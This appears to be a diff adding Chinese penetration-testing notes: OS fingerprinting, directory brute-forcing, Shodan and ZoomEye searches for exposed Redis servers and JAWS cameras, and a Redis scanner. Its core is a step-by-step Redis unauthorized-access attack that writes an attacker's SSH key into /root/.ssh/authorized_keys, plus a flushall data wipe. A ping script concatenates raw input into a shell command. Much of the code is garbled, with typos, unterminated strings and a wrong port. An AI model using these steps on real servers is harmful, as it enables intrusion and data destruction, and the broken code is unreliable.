@@ -1414,3 +1414,392 @@ def regex(response, port):
 ```
 
 </details>
+
+<details>
+<summary>系统识别</summary>
+
+```
+//windows TTL 128
+//Linux TTL 64
+
+#!/usr/bin/python3.7
+#!coding:utf-8
+from optparse import OptionParser
+import os
+import re
+
+def main():
+    parser = OptionParser("Usage:%prog -i <target host> " )
+    parser.add_option('-i', type = 'string', dest = 'IP', help = 'specify target host')
+    options, args = parser.parse_args()
+    ip = options.IP
+    ttl_scan(ip)
+
+if __name__ == "__main__":
+    main()
+
+//调用os.popen()函数执行ping命令，并将返回的结果通过正则表达式识别re.compile()
+def ttl_scan(ip):
+    ttlstrmatch = re.compile(r'ttl=\d+')
+    ttlnummatch = re.compile('r\d+')
+    result = os.popen("ping -c 1 " + ip)
+    res = result.read()
+    for line in res.splitlines():
+        result = ttlstrmatch.findall(line)
+        if result:
+            ttl = ttlnummatch.findall(result[0])
+            if int(ttl[0]) <= 64:
+                print("%s is Linux/UNIX "%ip)
+            else:
+                print("%s is Windows"%ip)
+        else:
+            pass
+
+//运行
+// # python3 sys_host.py -i IP
+```
+
+</details>
+
+<details>
+<summary>系统识别_Nmap库</summary>
+
+```
+result = nm.scan(hosts = targetIP, arguments = '-O')
+
+# python3 nmap_system_scan.py -i IP
+```
+
+</details>
+
+<details>
+<summary>敏感目录探测</summary>
+
+```
+//先导入requests模块，等待用户输入url和字典
+import requests
+headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0) Gecko/20100101 Firefox/6.0" }
+url = input("url: ")
+txt = input('php.txt;)
+
+//当用户没有输入字典时，默认打开根目录的php.txt，然后将字典中的内容放进队列中
+url_list = []
+if txt == "":
+    txt = "php.txt"
+try:
+    with open(txt, 'r') as f :
+        for a  in f:
+            a = a.replace('\n', '')
+            url_list.append(a)
+        f.close()
+except:
+    print("error! ")
+
+//将队列中的内容拼接到url中组成需要验证的地址，通过返回值判断是否存在此目录
+for li in url_list:
+    conn = "http://" + url + "/" + li
+
+    try:
+        response = requests.get(conn, headers = headers)
+        print("%s------------------------%s" %(conn, response))
+    except e:
+        print('%s--------------------%s', %(conn, e.code))
+```
+
+</details>
+
+#### 网络空间引擎 Shodan,Censys,ZoomEye,Fofa,PunkSPIDER,IVER(Drunk),’傻 蛋‘
+
+<details>
+<summary>ZoomEye</summary>
+
+```
+//搜索语法
+
+// app:"Apache httpd" +os:"linux" +country:US +city:"New York City"
+
+// site:google.com +os:linux +country:US +city:"New York City"
+
+//官方指导手册 https://www.zoomeye.org/doc
+----------------------------------------------------------------------------
+//方法一：通过curl命令直接获取access_token,其中username为邮箱或手机号码
+curl -X POST https://api.zoomeye.org/user/login -d '{ "username":"xx@gmail.com", "password":"xxx"}'
+----------------------------------------------------------------------------
+//方法二：通过python脚本获取access_token,构造post请求方式，将用户和密码以json的格式发送到ZoomEye的后端，打印出响应数据包
+#!/usr/bin/python
+#coding:utf-8
+import requests
+import json
+
+def main():
+username = imput("username:")
+password = input("password:")
+url = "https://api.zoomeye.org/user/login:
+data = json.dumps({'username': username, 'password': password})
+access_key = requests.port(url=url, data = data, verify = False)
+
+if __name__ == "__main__":
+    main()
+
+//运行
+// # python3 ZoomEye_token.py
+```
+</details>
+
+<details>
+<summary>ZoomEye_查询开放6379端口的服务器IP地址_Redis数据库</summary>
+
+```
+#!/usr/bin/python
+#coding:utf-8
+import requests
+from bs4 import BeautifulSoup
+import json
+import re
+
+def main():
+    headers = {
+        "Authorization": "JwT eyJhbD****************"
+    }
+    url = "https://api.zoomeye.org/host/search?query=port:6370&page=1&facet=app,os"
+    info = requests.get(url=url, headers=headers)
+    r_decoded = json.loads(info.text)
+    for line in r_decode['matches']:
+        print(line['ip']+': 'str(line['portinfo']['port']))
+
+if __name__ == '__main__':
+    try:
+        main()
+    except KeyboardInterrupt:
+        print("interrupted by user, killing all threads...")
+
+//运行
+// # python3 ZoomEye.py
+```
+
+</details>
+
+<details>
+<summary>Shodan</summary>
+
+```
+//搜索语法
+
+// city:"Beijing" port:80 os:"windows"
+
+//官方PAI https://developer.shadan.io/api
+
+//shodan_api.count(query, facets=None):查询结果数量
+//shadan_api.host(ip, history=False):获取一个IP的信息信息
+//shadan_api.ports():端口号
+//shadan_api.protocols()
+//shadan_api.servoces()
+//shadan_api.scan(ips, force=False):使用Shodan进行扫描，ips可以为字符或字典类型
+----------------------------------------------------------------------------
+```
+
+</details>
+
+<details>
+<summary>Shodan_获取host方法获取指定IP相关信息</summary>
+
+```
+import shodan
+//初始化API
+import json
+SHODAN_API_KEY = 'Hg46p**************'
+shodan_api=shodam.Shodan(SHODAN_API_KEY)
+
+ip = shodan_api.host('8.8.8.8')
+print(json.dumps(ip))
+
+//运行结果：
+// {"region_code": null, "ip": 134744072, "postal_code": null, "country_code":"US", ...."ip_str": "8.8.8.8", "os": null, "ports": [53]}
+```
+
+</details>
+
+<details>
+<summary>Shodan_搜索JAWS摄像头，将IP和端口打印出来</summary>
+
+```
+import shodan
+import json
+SHODAN_API_KEY = 'Hg4t6PpP**********'
+shodan_api=shodan.Shodan(SHODAN_API_KEY)
+
+results = shodan_api.search('JAWS/1.0')
+print('Results found:%s"%results['total'])
+for result in results['matches']:
+    print(result['ip_str'] +":"+str(result['port']))
+
+//运行
+//python shodan.py
+```
+
+</details>
+
+----------------------------------------------------------------------------
+#### 漏洞检测与防御
+
+<details>
+<summary>Redis && SSH公钥文件</summary>
+
+```
+通常，服务上的Redis绑定在0.0.0.0:6379
+
+~# redis-cli -h IP  //未授权访问
+查看key和其对应的值：keys *
+获取用户名 get user
+获取登录指令 get password
+删除所有数据 flushall
+
+修改数据库的默认路径为/root/.ssh
+默认缓存文件为 authorized.keys
+
+将目标主机缓存的公钥作为value保存在authorized.keys文件中，这样就在服务器/root/.ssh下生成了一个授权的key
+----------------------------------------------------------------------------
+>>> ssh-keygen -t rsa
+
+>>> cd /root/.ssh
+>>> ls
+>>> (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > key.txt
+>>> cat /root/key.txt
+
+//将txt文件中的公钥导入Redis缓存中
+>>> cat /root/key.txt | redis-cli -h IP
+
+# cat /root/key.txt | redis-cli -h IP -x set xxx //将运行结果导入Redis缓存
+
+//连接到目标主机
+>>> redis-cli -h IP
+>>> config set dir /root/.ssh
+>>> config set dbfilename authoruzed_keys
+>>> save
+
+>>> ssh IP 
+----------------------------------------------------------------------------
+```
+
+</details>
+
+<details>
+<summary>Redis检测方法</summary>
+
+```
+if __name__ == '__main__':
+    try:
+        start(sys.argv[1:])
+    except KeyboardIneterrupted by user, killing all threads...")
+
+def start(argv):
+    dict = {}
+    url = ""
+    tyrp = ""
+    if len(sys.argv) < 2:
+        print("-h 帮助信息;\n")
+        sys.exit()
+    try:
+        banner()
+        opts, args = getopt.getopt(argv, "-u:-p:-s:-h")
+    except getopt.GetoptError:
+        print('Error an argument!')
+        sys.exit()
+    for opt, arg in opts:
+        if opt == "-u":
+            url = arg
+        elif opt == "-s":
+            type == arg
+        elif opt == "-p":
+            port = arg
+        elif opt == "-h":
+            print(usage())
+    launcher(url,type,port)
+
+def banner():
+    print("\033[1;34m#############################\033[1;32mXXXXXXXXXX\033[1;34###########################\033[0m\n')
+
+def usage():
+    print('-h: --help 帮助;')
+    print('-p: --port 端口')
+    print('-u: --url;')
+    print('-s: --type Redis')
+    sys.exit()
+
+//运行
+// # python3 redis_unauthorized_access.py -h
+
+//利用recvdata()函数接收目标主机返回的数据，当返回的数据含有'redis version'字符串时，表明存在未授权访问漏洞，否则不存在
+## 为授权函数检测
+def redis_unanthoried(url, port):
+    result = []
+    s = socket.socket()
+    payload = "\x2a\x31\x0d\x0a\x24\x34\x0d\x0a\x69\x6e\x66\x6f\x0d\x0a"
+    socket.setdefaulttimelout(10)
+    for ip in url:
+        try:
+            s.connect((ip, int(port)))
+            s.sendall(payload.encode())
+            recvdata = s.recv(1024).decode()
+            if recvdata and 'redis_version' in recvdata:
+                reuslt.append(str(ip) + ':' + str(port) + ':' + '\033[1;32;40msuccess\033[0m')
+        except:
+            pass
+            result.append(str(ip) + ':' + str(port) + ':' + '\033[1;31;40mfailed \033[0m')
+        s.close()
+    return(result)
+
+def url_exec(url):
+    i = 0
+    zi = []
+    group = []
+    group1 = []
+    group2 = []
+    li = url.split('.')
+    if(url.find('-') == -1 ):
+        group.append(url)
+        zi = group
+    else:
+        for s in li:
+            a = s.find('-')
+            if a != -1:
+                i = i + 1
+        zi = url_list(li)
+        if i > 1 :
+            for li in zi:
+                zz = url_list(li.split('.'))
+                for ki in zz :
+                    group.append(ki)
+            zi = group
+            i = i -1
+        if i > 1:
+            for li in zi:
+                zzz = url_list(li.split('.')
+                for ki in zzz:
+                    group1.append(ki)
+            zi = group1
+            i = i - 1
+        if i > 1 :
+            for li in zi:
+                zzzz = url_list(li.split('.'))
+                for ki in zzzz:
+                    group2.append(ki)
+            zi = group2
+    return zi
+
+def output_exec(output,type):
+    print("\033[1;32;34m"+type+".....\033[0m")
+    print("+++++++++++++++++++++++++++++++++++++")
+    print("|      ip     |     port     |     status    |")
+    for  li in output:
+        print("+------------+---------------+-------------+")
+        print("|    "+li.replace(":","     |     ")+"    |  ")
+    print("+-------------+-------------+------------+\n")
+    pritn("[*] shutting down....")
+
+//运行
+// # python3 redis_unauthorized_access.py -u IP -p 6379 -s Redis
+```
+
+</details>
+
